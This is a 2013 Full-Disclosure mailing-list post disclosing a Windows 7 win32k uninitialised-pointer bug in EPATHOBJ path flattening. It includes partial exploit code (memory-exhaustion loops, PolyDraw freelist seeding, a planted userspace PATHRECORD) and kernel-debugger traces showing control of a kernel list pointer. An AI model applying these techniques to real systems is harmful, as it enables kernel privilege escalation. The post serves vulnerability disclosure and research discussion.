@@ -1,0 +1,283 @@
+
+Date: Fri, 17 May 2013 14:26:10 -0700
+From: Tavis Ormandy <taviso@...xchg8b.com>
+To: full-disclosure@...ts.grok.org.uk
+Subject: exploitation ideas under memory pressure
+
+List, there's a pretty obvious bug in win32k!EPATHOBJ::pprFlattenRec where the
+PATHREC object returned by win32k!EPATHOBJ::newpathrec doesn't initialise the
+next list pointer. The bug is really nice, but exploitation when
+allocations start failing is tricky.
+
+As vuln-dev is dead, I thought I'd post here, I don't have much free
+time to work on silly Microsoft code, so I'm looking for ideas on how to
+fix the final obstacle for exploitation. I first published details about
+this in March, but here's a recap:
+
+; BOOL __thiscall EPATHOBJ::newpathrec(EPATHOBJ     *this,
+                                       PATHRECORD   **pppr,
+                                       ULONG         *pcMax,
+                                       ULONG cNeeded)
+.text:BFA122CA                 mov     esi, [ebp+ppr]
+.text:BFA122CD                 mov     eax, [esi+PATHRECORD.pprPrev]
+.text:BFA122D0                 push    edi
+.text:BFA122D1                 mov     edi, [ebp+pprNew]
+.text:BFA122D4                 mov     [edi+PATHRECORD.pprPrev], eax
+.text:BFA122D7                 lea     eax, [edi+PATHRECORD.count]
+.text:BFA122DA                 xor     edx, edx
+.text:BFA122DC                 mov     [eax], edx
+.text:BFA122DE                 mov     ecx, [esi+PATHRECORD.flags]
+.text:BFA122E1                 and     ecx, not (PD_BEZIER)
+.text:BFA122E4                 mov     [edi+PATHRECORD.flags], ecx
+.text:BFA122E7                 mov     [ebp+pprNewCountPtr], eax
+.text:BFA122EA                 cmp     [edi+PATHRECORD.pprPrev], edx
+.text:BFA122ED                 jnz     short loc_BFA122F7
+.text:BFA122EF                 mov     ecx, [ebx+EPATHOBJ.ppath]
+.text:BFA122F2                 mov     [ecx+PATHOBJ.pprfirst], edi
+
+It turns out this mostly works because newpathrec() is backed by newpathalloc()
+which uses PALLOCMEM(). PALLOCMEM() will always zero the buffer returned.
+
+; PVOID __stdcall PALLOCMEM(size_t size, int tag)
+.text:BF9160D7                 xor     esi, esi
+.text:BF9160DE                 push    esi
+.text:BF9160DF                 push    esi
+.text:BF9160E0                 push    [ebp+tag]
+.text:BF9160E3                 push    [ebp+size]
+.text:BF9160E6                 call    _HeavyAllocPool@16 ; HeavyAllocPool(x,x,x,x)
+.text:BF9160EB                 mov     esi, eax
+.text:BF9160ED                 test    esi, esi
+.text:BF9160EF                 jz      short loc_BF9160FF
+.text:BF9160F1                 push    [ebp+size]      ; size_t
+.text:BF9160F4                 push    0               ; int
+.text:BF9160F6                 push    esi             ; void *
+.text:BF9160F7                 call    _memset
+
+However, the PATHALLOC allocator includes it's own freelist implementation, and
+if that codepath can satisfy a request the memory isn't zeroed and returned
+directly to the caller. This effectively means that we can add our own objects
+to the PATHRECORD chain.
+
+We can force this behaviour under memory pressure relatively easily, I just
+spam HRGN objects until they start failing. This isn't super reliable, but it's
+good enough for testing.
+
+        // I don't use the simpler CreateRectRgn() because it leaks a GDI handle on
+        // failure. Seriously, do some damn QA Microsoft, wtf.
+        for (Size = 1 << 26; Size; Size >>= 1) {
+            while (CreateRoundRectRgn(0, 0, 1, Size, 1, 1))
+                ;
+        }
+
+Adding user controlled blocks to the freelist is a little trickier, but I've
+found that flattening large lists of bezier curves added with PolyDraw() can
+accomplish this reliably. The code to do this is something along the lines of:
+
+        for (PointNum = 0; PointNum < MAX_POLYPOINTS; PointNum++) {
+            Points[PointNum].x      = 0x41414141 >> 4;
+            Points[PointNum].y      = 0x41414141 >> 4;
+            PointTypes[PointNum]    = PT_BEZIERTO;
+        }
+
+        for (PointNum = MAX_POLYPOINTS; PointNum; PointNum -= 3) {
+            BeginPath(Device);
+            PolyDraw(Device, Points, PointTypes, PointNum);
+            EndPath(Device);
+            FlattenPath(Device);
+            FlattenPath(Device);
+            EndPath(Device);
+        }
+
+We can verify this is working by putting a breakpoint after newpathrec, and
+verifying the buffer is filled with recognisable values when it returns:
+
+kd> u win32k!EPATHOBJ::pprFlattenRec+1E
+win32k!EPATHOBJ::pprFlattenRec+0x1e:
+95c922b8 e8acfbffff      call    win32k!EPATHOBJ::newpathrec (95c91e69)
+95c922bd 83f801          cmp     eax,1
+95c922c0 7407            je      win32k!EPATHOBJ::pprFlattenRec+0x2f (95c922c9)
+95c922c2 33c0            xor     eax,eax
+95c922c4 e944020000      jmp     win32k!EPATHOBJ::pprFlattenRec+0x273 (95c9250d)
+95c922c9 56              push    esi
+95c922ca 8b7508          mov     esi,dword ptr [ebp+8]
+95c922cd 8b4604          mov     eax,dword ptr [esi+4]
+kd> ba e 1 win32k!EPATHOBJ::pprFlattenRec+23 "dd poi(ebp-4) L1; gc"
+kd> g
+fe938fac  41414140
+fe938fac  41414140
+fe938fac  41414140
+fe938fac  41414140
+fe938fac  41414140
+
+The breakpoint dumps the first dword of the returned buffer, which matches the
+bezier points set with PolyDraw(). So convincing pprFlattenRec() to move
+EPATHOBJ->records->head->next->next into userspace is no problem, and we can
+easily break the list traversal in bFlattten():
+
+BOOL __thiscall EPATHOBJ::bFlatten(EPATHOBJ *this)
+{
+  EPATHOBJ *pathobj; // esi@1
+  PATHOBJ *ppath; // eax@1
+  BOOL result; // eax@2
+  PATHRECORD *ppr; // eax@3
+
+  pathobj = this;
+  ppath = this->ppath;
+  if ( ppath )
+  {
+    for ( ppr = ppath->pprfirst; ppr; ppr = ppr->pprnext )
+    {
+      if ( ppr->flags & PD_BEZIER )
+      {
+        ppr = EPATHOBJ::pprFlattenRec(pathobj, ppr);
+        if ( !ppr )
+          goto LABEL_2;
+      }
+    }
+    pathobj->fl &= 0xFFFFFFFE;
+    result = 1;
+  }
+  else
+  {
+LABEL_2:
+    result = 0;
+  }
+  return result;
+}
+
+All we have to do is allocate our own PATHRECORD structure, and then spam
+PolyDraw() with POINTFIX structures containing co-ordinates that are actually
+pointers shifted right by 4 (for this reason the structure must be aligned so
+the bits shifted out are all zero).
+
+We can see this in action by putting a breakpoint in bFlatten when ppr has
+moved into userspace:
+
+kd> u win32k!EPATHOBJ::bFlatten
+win32k!EPATHOBJ::bFlatten:
+95c92517 8bff            mov     edi,edi
+95c92519 56              push    esi
+95c9251a 8bf1            mov     esi,ecx
+95c9251c 8b4608          mov     eax,dword ptr [esi+8]
+95c9251f 85c0            test    eax,eax
+95c92521 7504            jne     win32k!EPATHOBJ::bFlatten+0x10 (95c92527)
+95c92523 33c0            xor     eax,eax
+95c92525 5e              pop     esi
+kd> u
+win32k!EPATHOBJ::bFlatten+0xf:
+95c92526 c3              ret
+95c92527 8b4014          mov     eax,dword ptr [eax+14h]
+95c9252a eb14            jmp     win32k!EPATHOBJ::bFlatten+0x29 (95c92540)
+95c9252c f6400810        test    byte ptr [eax+8],10h
+95c92530 740c            je      win32k!EPATHOBJ::bFlatten+0x27 (95c9253e)
+95c92532 50              push    eax
+95c92533 8bce            mov     ecx,esi
+95c92535 e860fdffff      call    win32k!EPATHOBJ::pprFlattenRec (95c9229a)
+
+So at 95c9252c eax is ppr->next, and the routine checks for the PD_BEZIERS
+flags (defined in winddi.h). Let's break if it's in userspace:
+
+kd> ba e 1 95c9252c "j (eax < poi(nt!MmUserProbeAddress)) 'gc'; ''"
+kd> g
+95c9252c f6400810        test    byte ptr [eax+8],10h
+kd> r
+eax=41414140 ebx=95c1017e ecx=97330bec edx=00000001 esi=97330bec edi=0701062d
+eip=95c9252c esp=97330be4 ebp=97330c28 iopl=0         nv up ei pl nz na po nc
+cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010202
+win32k!EPATHOBJ::bFlatten+0x15:
+95c9252c f6400810        test    byte ptr [eax+8],10h       ds:0023:41414148=??
+
+The question is how to turn that into code execution? It's obviously trivial to
+call prFlattenRec with our userspace PATHRECORD..we can do that by setting
+PD_BEZIER in our userspace PATHRECORD, but the early exit on allocation failure
+poses a problem.
+
+Let me demonstrate calling it with my own PATHRECORD (this code is attached):
+
+    // Create our PATHRECORD in userspace we will get added to the EPATHOBJ
+    // pathrecord chain.
+    PathRecord = VirtualAlloc(NULL,
+                              sizeof(PATHRECORD),
+                              MEM_COMMIT | MEM_RESERVE,
+                              PAGE_EXECUTE_READWRITE);
+
+    // Initialise with recognisable debugging values.
+    FillMemory(PathRecord, sizeof(PATHRECORD), 0xCC);
+
+    PathRecord->next    = (PVOID)(0x41414141);
+    PathRecord->prev    = (PVOID)(0x42424242);
+
+    // You need the PD_BEZIERS flag to enter EPATHOBJ::pprFlattenRec() from
+    // EPATHOBJ::bFlatten(), do that here.
+    PathRecord->flags   = PD_BEZIERS;
+
+    // Generate a large number of Bezier Curves made up of pointers to our
+    // PATHRECORD object.
+    for (PointNum = 0; PointNum < MAX_POLYPOINTS; PointNum++) {
+        Points[PointNum].x      = (ULONG)(PathRecord) >> 4;
+        Points[PointNum].y      = (ULONG)(PathRecord) >> 4;
+        PointTypes[PointNum]    = PT_BEZIERTO;
+    }
+
+kd> ba e 1 win32k!EPATHOBJ::pprFlattenRec+28 "j (dwo(ebp+8) < dwo(nt!MmUserProbeAddress)) ''; 'gc'"
+kd> g
+win32k!EPATHOBJ::pprFlattenRec+0x28:
+95c922c2 33c0            xor     eax,eax
+kd> dd ebp+8 L1
+a3633be0  00130000
+
+The ppr object is in userspace! If we peek at it:
+
+kd> dd poi(ebp+8)
+00130000  41414141 42424242 00000010 cccccccc
+00130010  00000000 00000000 00000000 00000000
+00130020  00000000 00000000 00000000 00000000
+00130030  00000000 00000000 00000000 00000000
+00130040  00000000 00000000 00000000 00000000
+00130050  00000000 00000000 00000000 00000000
+00130060  00000000 00000000 00000000 00000000
+00130070  00000000 00000000 00000000 00000000
+
+There's the next and prev pointer.
+
+kd> kvn
+ # ChildEBP RetAddr  Args to Child              
+00 a3633bd8 95c9253a 00130000 002bfea0 95c101ce win32k!EPATHOBJ::pprFlattenRec+0x28 (FPO: [Non-Fpo])
+01 a3633be4 95c101ce 00000001 00000294 fe763360 win32k!EPATHOBJ::bFlatten+0x23 (FPO: [0,0,4])
+02 a3633c28 829ab173 0701062d 002bfea8 7721a364 win32k!NtGdiFlattenPath+0x50 (FPO: [Non-Fpo])
+03 a3633c28 7721a364 0701062d 002bfea8 7721a364 nt!KiFastCallEntry+0x163 (FPO: [0,3] TrapFrame @ a3633c34)
+
+The question is how to get PATHALLOC() to succeed under memory pressure so we
+can make this exploitable, my first thought was have another thread
+manipulating the free pool, but I can't figure out how to synchronize
+that. Getting code execution should be trivial after this.
+
+I guess it's possible to just race it until we win, but this seems like an
+inelegant solution. Anyone have any ideas?
+
+I've been testing under this kernel:
+
+kd> vertarget
+Windows 7 Kernel Version 7601 (Service Pack 1) MP (1 procs) Checked x86
+compatible
+Product: WinNt, suite: TerminalServer SingleUserTS
+Built by: 7601.17514.x86chk.win7sp1_rtm.101119-1850
+Machine Name:
+Kernel base = 0x8280f000 PsLoadedModuleList = 0x82c55430
+Debug session time: Fri May 17 14:14:24.723 2013 (UTC - 7:00)
+System Uptime: 49 days 16:12:11.803 (checked kernels begin at 49 days)
+
+I assume the same code exists in 8.
+
+Tavis.
+
+P.S. As far as I can tell, this code is pre-NT (20+ years) old, so
+remember to thank the SDL for solving security and reminding us that old
+code doesn't need to be reviewed ;-)
+
+View attachment "ComplexPath.c" of type "text/plain" (5340 bytes)
+
+_______________________________________________
+Full-Disclosure - We believe in it.
+Charter: http://lists.grok.org.uk/full-disclosure-charter.html
+Hosted and sponsored by Secunia - http://secunia.com/
